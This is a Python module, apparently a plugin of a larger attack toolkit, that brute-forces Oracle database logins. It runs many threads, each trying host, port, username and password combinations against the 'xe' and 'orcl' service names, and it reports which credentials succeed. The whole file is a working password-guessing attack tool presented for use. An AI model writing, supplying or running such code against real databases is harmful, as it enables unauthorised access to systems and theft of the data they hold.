#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
@Author: reber
@Mail: reber0ask@qq.com
@Date: 2019-09-25 21:11:15
@LastEditTime: 2019-12-28 14:36:15
'''

import cx_Oracle
from concurrent.futures import ThreadPoolExecutor

class OracleBruteForce(object):
    """OracleBruteForce"""
    def __init__(self, targets, thread_num, timeout):
        super(OracleBruteForce, self).__init__()
        self.targets = targets
        self.thread_num = thread_num
        self.timeout = timeout

    def worker(self,hpup):
        host,port,user,pwd = hpup
        oracle_tns1 = "{}/{}@{}:{}/xe".format(user,pwd,host,port)
        oracle_tns2 = "{}/{}@{}:{}/orcl".format(user,pwd,host,port)
        try:
            conn = cx_Oracle.connect(oracle_tns1)
        except cx_Oracle.DatabaseError as e:
            try:
                conn = cx_Oracle.connect(oracle_tns2)
            except Exception as e:
                hook_msg((False,host,port,user,pwd))
            else:
                hook_msg((True,host,port,user,pwd))
                conn.close()
        except Exception as e:
            hook_msg((False,host,port,user,pwd))
        else:
            hook_msg((True,host,port,user,pwd))
            conn.close()

    def run(self):
        with ThreadPoolExecutor(max_workers = self.thread_num) as executor:
            for host,port,user,pwd in self.targets:
                f = executor.submit(self.worker,(host,port,user,pwd))

bruter = OracleBruteForce
